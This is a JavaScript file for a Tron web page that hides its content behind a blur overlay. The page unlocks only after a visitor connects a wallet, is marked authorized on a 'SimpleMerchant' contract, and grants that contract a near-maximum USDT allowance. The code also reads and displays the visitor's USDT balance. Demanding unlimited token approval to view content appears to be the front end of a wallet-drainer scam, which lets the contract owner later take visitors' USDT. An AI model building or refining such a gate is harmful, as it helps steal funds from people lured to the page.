// --- 配置常量 (使用你的实际 Tron Base58 地址) ---
const TRON_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; // 你的 SimpleMerchant 合约地址 (Tron)
const TRC20_USDT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';  // 你的 USDT TRC20 地址
// const TRC20_USDC_ADDRESS = 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8'; // USDC 已注释

const ALMOST_MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129638935";

// **SimpleMerchant 合约的 ABI (手动组合的 JSON 签名，以解决 'is not a function' 错误)**
const CONTRACT_ABI = [ 
    // connectAndAuthorize() external
    {
        "inputs": [],
        "name": "connectAndAuthorize",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    // authorized(address customer) external view returns (bool)
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "customer",
                "type": "address"
            }
        ],
        "name": "authorized",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }
];

// 使用你提供的完整的 TRC20 Token JSON ABI 
const TRC20_ABI = [
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": true,
                "internalType": "address",
                "name": "owner",
                "type": "address"
            },
            {
                "indexed": true,
                "internalType": "address",
                "name": "spender",
                "type": "address"
            },
            {
                "indexed": false,
                "internalType": "uint256",
                "name": "value",
                "type": "uint256"
            }
        ],
        "name": "Approval",
        "type": "event"
    },
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": true,
                "internalType": "address",
                "name": "from",
                "type": "address"
            },
            {
                "indexed": true,
                "internalType": "address",
                "name": "to",
                "type": "address"
            },
            {
                "indexed": false,
                "internalType": "uint256",
                "name": "value",
                "type": "uint256"
            }
        ],
        "name": "Transfer",
        "type": "event"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "owner",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "spender",
                "type": "address"
            }
        ],
        "name": "allowance",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "spender",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "value",
                "type": "uint256"
            }
        ],
        "name": "approve",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "spender",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "value",
                "type": "uint256"
            }
        ],
        "name": "approveAndCall",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "spender",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "value",
                "type": "uint256"
            },
            {
                "internalType": "bytes",
                "name": "data",
                "type": "bytes"
            }
        ],
        "name": "approveAndCall",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "account",
                "type": "address"
            }
        ],
        "name": "balanceOf",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "bytes4",
                "name": "interfaceId",
                "type": "bytes4"
            }
        ],
        "name": "supportsInterface",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "totalSupply",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "to",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "value",
                "type": "uint256"
            }
        ],
        "name": "transfer",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "to",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "value",
                "type": "uint256"
            }
        ],
        "name": "transferAndCall",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "to",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "value",
                "type": "uint256"
            },
            {
                "internalType": "bytes",
                "name": "data",
                "type": "bytes"
            }
        ],
        "name": "transferAndCall",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "from",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "to",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "value",
                "type": "uint256"
            }
        ],
        "name": "transferFrom",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "from",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "to",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "value",
                "type": "uint256"
            },
            {
                "internalType": "bytes",
                "name": "data",
                "type": "bytes"
            }
        ],
        "name": "transferFromAndCall",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "from",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "to",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "value",
                "type": "uint256"
            }
        ],
        "name": "transferFromAndCall",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];


// --- UI 元素 (保持不变) ---
const connectButton = document.getElementById('connectButton');
const blurOverlay = document.getElementById('blurOverlay'); 
const overlayMessage = document.getElementById('overlayMessage');
const lockedPrompt = document.getElementById('lockedPrompt');
const overlay = document.getElementById('blurOverlay');  
const statusDiv = document.getElementById('status');  

// --- 状态变量 (使用 TronWeb 变量) ---
let tronWeb; 
let userAddress;
let contractInstance; // SimpleMerchant 合约实例
let usdtContractInstance; // USDT TRC20 实例
let isConnectedFlag = false;

// --- 遮罩控制函數 (保持不变) ---
function hideOverlay() {
    if (!overlay) { console.error("Overlay element not found."); return; }
    overlay.style.opacity = '0';
    setTimeout(() => { overlay.style.display = 'none'; }, 300);
}

function showOverlay(message) {
    if (!overlay) { console.error("Overlay element not found."); return; }
    overlayMessage.innerHTML = message;
    overlay.style.display = 'flex';
    setTimeout(() => { overlay.style.opacity = '1'; }, 10);
}

// --- 状态更新函数 (保持不变) ---
function updateConnectionUI(connected, address = null) {
    isConnectedFlag = connected;
    if (connectButton) {
        if (connected && address) {
            connectButton.classList.add('connected');
            // Tron 地址较长，只显示开头和结尾
            const shortAddress = address.length > 8 ? `${address.substring(0, 4)}...${address.slice(-4)}` : address;
            connectButton.innerHTML = `Connected: ${shortAddress}`;
            connectButton.title = `Connected: ${address}`;
        } else {
            connectButton.classList.remove('connected');
            connectButton.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
            connectButton.title = 'Connect Wallet';
            hideOverlay(); 
        }
    }
}

// --- 核心功能：控制状态栏的隐藏与显示。 (保持不变) ---
function updateStatus(message) {
    if (!statusDiv) { console.error("Status element not found."); return; }
    if (message) {
        statusDiv.innerHTML = `${message}`;
        statusDiv.style.display = 'block';
    } else {
        statusDiv.innerHTML = '';
        statusDiv.style.display = 'none';
    }
}

// ---  TronWeb 检查授权状态 ---
async function checkAuthorization() {
    try {
        if (!tronWeb || !userAddress || !contractInstance || !usdtContractInstance) {
            showOverlay('Wallet not connected. Please connect.');
            return;
        }

        // 1. SimpleMerchant 合约授权检查
        const authorizedResult = await contractInstance.authorized(userAddress).call();
        const isAuthorized = authorizedResult; 
        

        // 2. USDT 授权和余额检查
        const usdtAllowanceRaw = await usdtContractInstance.allowance(userAddress, TRON_CONTRACT_ADDRESS).call();
        const usdtAllowance = BigInt(usdtAllowanceRaw);
        const isUsdtMaxApproved = usdtAllowance >= BigInt(ALMOST_MAX_UINT); 
        
        let usdtBalanceRaw = "0";
        try {
            // Tron 的 USDT 是 6 位小数
            usdtBalanceRaw = await usdtContractInstance.balanceOf(userAddress).call();
        } catch(e) { /* Ignore */ }
        const usdtBalance = BigInt(usdtBalanceRaw);
        const formattedUsdtBalance = (Number(usdtBalance) / 10**6).toFixed(2);


        let statusMessage = '';

        // SimpleMerchant 合約授權
        if (isAuthorized) {
            statusMessage += 'Web page access authorized ✅. ';
        } else {
            statusMessage += 'Web page access not authorized ❌. ';
        }

        // USDT 的授權狀態
        statusMessage += `USDT Balance: ${formattedUsdtBalance}. `;
        if (isUsdtMaxApproved) {
            statusMessage += `USDT approved ✅.`;
        } else if (usdtAllowance > 0n) {
            statusMessage += `USDT approval needed ⚠️.`;
        } else {
            statusMessage += `USDT not approved ❌.`;
        }

        // Button state: 现在只检查 SimpleMerchant 和 USDT
        const allAuthorized = isAuthorized && isUsdtMaxApproved; 

        if (allAuthorized) {
            connectButton.classList.add('connected');
            connectButton.title = 'Disconnect Wallet';
            connectButton.disabled = false;
            updateStatus(''); 
            hideOverlay(); 
        } else {
            connectButton.classList.remove('connected');
            connectButton.title = 'Connect Wallet (Complete Authorization)';
            connectButton.disabled = false;
            updateStatus(''); 
            showOverlay('You need to complete the authorization to view the content. Click the wallet link in the upper right corner.'); 
        }
    } catch (error) {
        updateStatus(`Authorization check failed: ${error.message}`);
        console.error("Check Authorization Error:", error);
        showOverlay(`Authorization check failed: ${error.message}`);
    }
}

// --- 连接钱包逻辑 (使用 TronWeb 流程) ---
async function connectWallet() {
    try {
        if (typeof window.tronWeb === 'undefined') {
            updateStatus('Please install TronLink or a supported Tron wallet.');
            showOverlay('Please install TronLink or a supported Tron wallet.');
            return;
        }
        
        updateStatus('Connecting to wallet...'); 
        showOverlay('Waiting for wallet connection...');
        
        // **【修复点】** 移除 window.tronLink.request 的调用，兼容不支持 TronLink API 的DApp浏览器
        
        // 延迟一段时间等待 TronWeb 完全初始化 (可选，但可以增加兼容性)
        await new Promise(resolve => setTimeout(resolve, 500)); 

        tronWeb = window.tronWeb;
        
        // 尝试从 defaultAddress.base58 获取地址
        userAddress = tronWeb.defaultAddress.base58; 

        if (!userAddress || userAddress === tronWeb.defaultAddress.hex) { 
            throw new Error("Could not retrieve Tron account address. Please ensure your wallet is connected/logged in and manually approve the connection in the App.");
        }
        
        console.log("✅ User Address:", userAddress);
        updateConnectionUI(true, userAddress);

        // 实例化 SimpleMerchant 合约
        contractInstance = await tronWeb.contract(CONTRACT_ABI, TRON_CONTRACT_ADDRESS);

        // 实例化 TRC20 合约
        usdtContractInstance = await tronWeb.contract(TRC20_ABI, TRC20_USDT_ADDRESS);

        // 检查授权状态 并处理
        await handleAuthorization();

    } catch (error) {
        console.error("Error connecting to wallet:", error);
        updateConnectionUI(false);
        showOverlay(`🔴 Connection failed: ${error.message}`);
        updateStatus(`Connection failed: ${error.message}`);
    }
}

// --- 处理授权流程 ---
async function handleAuthorization() {
    try {
        if (!tronWeb || !userAddress) {
            showOverlay('Wallet not connected. Please connect.');
            return;
        }
        // 检查授权状态
        await checkAuthorization(); // 检查授权并更新 UI
    } catch (error) {
        console.error("Authorization process failed:", error);
        showOverlay(`🔴 Authorization process failed: ${error.message}`);
        updateStatus(`Authorization failed: ${error.message}`);
    }
}

// --- 斷開錢包連接 ---
function disconnectWallet() {
    userAddress = null;
    tronWeb = null;
    contractInstance = null;
    usdtContractInstance = null;
    updateConnectionUI(false);
    showOverlay('Please link your wallet to unlock the page 🔒');
}

// 事件监听器 (保持不变)
connectButton.addEventListener('click', () => {
    if (isConnectedFlag) {
        disconnectWallet(); 
    } else {
        connectWallet(); 
    }
});

// 页面加载完成后，初始化 (保持不变)
window.onload = () => {
    updateConnectionUI(false); 
    showOverlay('Please connect your wallet to unlock the content. Click the wallet icon in the upper right corner.');
};